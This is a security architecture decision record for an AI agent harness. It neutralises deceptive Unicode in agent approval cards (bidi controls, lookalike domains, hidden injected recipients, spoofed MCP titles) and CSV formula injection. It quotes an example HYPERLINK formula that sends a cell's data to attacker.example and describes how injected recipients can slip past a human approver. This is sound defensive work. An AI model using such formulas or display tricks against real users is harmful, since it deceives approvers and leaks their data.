# ADR-TEXT-01: text a person decides on is shown as it is, and text a spreadsheet opens stays text

- **Findings:** SEC-B-04 (the approval card shows attacker-chosen text as it is) and SEC-B-06 (SQL result exports
  keep spreadsheet formulas), from R37-SECB
- **Package:** R40-TEXT
- **Scope:** every string a decision surface shows (the approval card, the grouped "Allow all" card, the
  unknown-effect card, the edit form, the jobs approval wording, the inbox), and every file the product writes for
  a spreadsheet to open

## Context

Both findings are one fault: text an outsider chose reaches a person, or a person's program, through a surface that
reads it differently from how it looks.

- **The card.** The worker named a destination as the call had it, Node served it as the worker journaled it, and
  the client rendered it as Node served it. None of the three neutralised deceptive Unicode, so a recipient wrapped
  in U+202E displayed as a colleague's address, a zero-width space split a domain, `pіpeshub.com` (Cyrillic і)
  read as the org's own site, eight colleagues pushed `drop@attacker.example` past the 120-character title, and a
  cc recipient was only counted, `(+1)`. An MCP server's `title` annotation could carry bidi text into the card's
  title, or a second ` · ` that let it name a server of its choosing. Token masking was shared (the
  `token-patterns` vector); this rule was not.
- **The exports.** The chat's table export prefixed a formula cell with `'`. The backend's SQL export
  (`_rows_to_csv_bytes`) had its own writer without that rule, so a CRM note holding
  `=HYPERLINK("https://attacker.example/?d="&B2,"open")` ran in Excel. Two writers, two rules.

## Decision

### 1. One display-safe rule, one vector, three implementations

`contracts/harness/vectors/display-safe.json` states the rule: its tables (invisible ranges, prose exceptions,
scripts, allowed mixes, lookalikes, hidden marks, the destination arguments) and its cases. Python
(`harness_core/security/display_safe.py`), Node (`src/modules/agent-harness/domain/display-safe.ts`) and the web
client (`lib/utils/display-safe.ts`, byte-identical to Node's) carry the tables as constants, because images ship
only their own tree. Each test suite replays every case and fails when a table in code differs from the vector; a
Node test fails when the two TypeScript copies differ.

- **Invisible and bidi characters become a visible marker**, `⟨U+202E⟩`: the bidi controls and isolates, the
  zero-width characters, the tag block, variation selectors, every format character (Cf), and C0/C1 controls.
  Removing them would hide that the text was crafted; a marker shows exactly what is there. In **prose** (a message
  body) tab, newline and carriage return stay, and a joiner or variation selector stays inside non-ASCII text, so an
  emoji sequence, a Persian non-joiner and an Indic conjunct read as written. In an **identifier** (an address, a
  channel, a host, a display name, a field name) every one is marked.
- **A host is shown in Unicode only when nothing in it can pass for another site.** A label that mixes scripts
  (outside the CJK mixes browsers allow), is a whole-script lookalike (every letter Cyrillic or Greek that looks
  Latin, under a TLD in another script), or holds a Latin letter that passes for an ASCII one (dotless i, small
  capitals, a dot below or an overlay mark) is shown in punycode. Labels are NFKC-folded first, as IDNA maps them,
  so a full-width `ｐipeshub.com` is shown as the `pipeshub.com` it resolves to. `münchen.de`, `日本語.jp` and
  `яндекс.com` read in Unicode.
- **The punycode form is the one in the label; the client shows the Unicode form beside it.** The card's note
  says "xn--ppeshub-rog.com mixes alphabets and looks like pіpeshub.com", so the person sees both the real address
  and why it would have fooled them.
- **In an identifier, a word that mixes scripts has its non-ASCII letters marked** (`#s⟨U+0430⟩les`). A channel or
  a local part cannot be shown in punycode; marking the odd letters says exactly which are not what they seem.
- **The rule is idempotent and leaves normal text alone.** The worker applies it when it journals, Node when it
  serves (a journal an older worker wrote), the client when it renders (a response it does not control). An
  accented name, a single-script word in any language and plain ASCII pass unchanged.

### 2. Where it applies

- **Worker.** `destination_wire` and the reason's source titles (`harness_core/effects/flow.py`); the destination
  label (`app/harness/flow_destination.py`); an MCP tool's and an API toolset operation's display name
  (`tool_display_name`: owner and title display-safe, and the title cannot hold the ` · ` separator, so the owner a
  client reads is always the configured one). Cuts never split a marker (`clip_display`).
- **Node.** The timeline projection (`approvalReason`, the approval's display name), which the chat, the approvals
  queue and the inbox read.
- **Web client.** `approval-preview.ts` (`safeText`, `previewPayload`, `approvalAction`, `toApprovalReason`,
  `maskedReason`, the diff lines), `interaction-wording.ts` (title, destination, app), the jobs approval wording;
  `display-safety.tsx` sets markers apart (`MarkedText`) and adds one note per card in words
  (`DisplaySafetyNote`), across every call of an "Allow all" card.

### 3. The destination label names every recipient's domain

- Every recipient argument (`to`, `cc`, `bcc` and their variants) is one list, so a cc recipient is named as one in
  `to` is.
- The list is ordered by domain frequency, least common first. The worker does not know which domains are the
  org's at this point; the least common domain is the one an injection adds, and this order puts it first however
  many colleagues come before it.
- A name is shown whole or not at all, and what has no room is counted with its domains: `(+6 @corp.example)`.
- The preview never cuts a destination argument (`destinationArgs` in the vector), so no recipient hides behind
  "Show all".

### 4. A third-party name never passes for a first-party app

An MCP server or API toolset whose name reads as one of PipesHub's own apps (case, spacing and punctuation
ignored) keeps a mark of what it is: "Send message in Slack (MCP)?". An agent's owner can name a server "Slack";
the people the agent is shared with then still see that it is not the Slack connector. "MCP" and "API" are names,
the same in every language. A first-party toolset's tool (`slack__…`) is never marked.

### 5. One spreadsheet-cell rule for every export

`contracts/harness/vectors/spreadsheet-cells.json` states it; Python (`harness_core/security/spreadsheet_cells.py`),
Node (`src/libs/utils/spreadsheet-cell.ts`) and the web client (`lib/utils/spreadsheet-cell.ts`, identical) carry
it. A text cell gets a leading `'` when it starts with TAB or CR, or when its first character after blanks (spaces,
no-break and ideographic spaces, a zero-width space, a BOM) is `=`, `+`, `-`, `@` or a full-width form of one,
unless it is a plain number (`-42`, `-1,234.56`, `-1.5e-3`, `-12.5%`) or a lone sign (a table's `-` placeholder).
Numbers, dates and nulls are written as values. Users:

- `_rows_to_csv_bytes`, which every SQL tool's export uses (`save_query_result_csv`), for the header row too;
- the chat's table export (`table-csv.ts`);
- Node, for any export it writes.

### Consequences

- A person deciding sees what will happen. A crafted string looks crafted, and the note says why in their language.
- A legitimate Vietnamese or Turkish host (a dot below, a dotless i) is shown in punycode with its Unicode form
  beside it. This was judged right: those marks are the ones an attacker uses, and the real form is still shown.
- A cell that is text starting with a sign (`+1 415 555 0100`, `- item`) opens with a visible apostrophe in some
  spreadsheets. This is the standard trade-off of formula neutralisation.
- The text inside an edit field is the call's own: a marker there would change what is sent. The fixed preview
  beside it and the "was" line are display-safe.
- Residual: a URL's userinfo (`https://pipeshub.com@evil.example/`) is shown as written; the destination label
  names the real site (`evil.example`), so the title is truthful, but the preview shows the full URL.

## As built

- Vectors: `contracts/harness/vectors/display-safe.json`, `contracts/harness/vectors/spreadsheet-cells.json`.
- Python: `harness_core/security/display_safe.py`, `harness_core/security/spreadsheet_cells.py`,
  `app/harness/flow_destination.py`, `harness_core/effects/flow.py`, `app/agents/agent_loop/mcp_tool_adapter.py`,
  `app/agents/agent_loop/openapi_tool_adapter.py`, `app/utils/conversation_tasks.py`.
- Node: `src/modules/agent-harness/domain/display-safe.ts`, `src/libs/utils/spreadsheet-cell.ts`,
  `src/modules/agent-harness/projection/timeline.ts`.
- Web client: `lib/utils/display-safe.ts`, `lib/utils/spreadsheet-cell.ts`,
  `app/(main)/chat/approval-preview.ts`, `app/(main)/chat/interaction-wording.ts`,
  `app/(main)/chat/components/message-area/display-safety.tsx` and the approval, grouped, unknown-effect and edit
  cards, `app/(main)/chat/utils/table-csv.ts`, `lib/harness-jobs/approval-words.ts`.
- Tests: the proofs `test_sec_b_04_*` (3), `test_sec_b_06_*` and `r37secb-approval-text.test.ts` (3) as plain tests;
  `test_r40text_display_vectors.py`, `test_r40text_card_text.py`, `r40text-display-vectors.test.ts` (Node),
  `r40text-display-vectors.test.ts` and `r40text-card-text.test.tsx` (web client).

## Deviations

- B-ai-attacks.md proposed showing a host's Unicode form only "when it is in the user's own script". The card does
  not know the reader's script; it shows the Unicode form when nothing in the host can pass for another site, and
  otherwise punycode with the Unicode form beside it in the note, so the reader sees both either way.
- It proposed naming external recipients first. The worker cannot tell the org's domains when it names a
  destination, so the label orders by domain frequency (least common first) and names the domains it has no room
  for; every domain still reaches the title.
- The Node and web-client copies of each rule are the same code but not byte-identical: each tree's formatter
  differs. The vector replay in both suites holds them to the same behaviour.

## Owner amendments

None.

## Status

**Accepted** 2026-11-13: decided from first principles, long term; built by R40-TEXT.
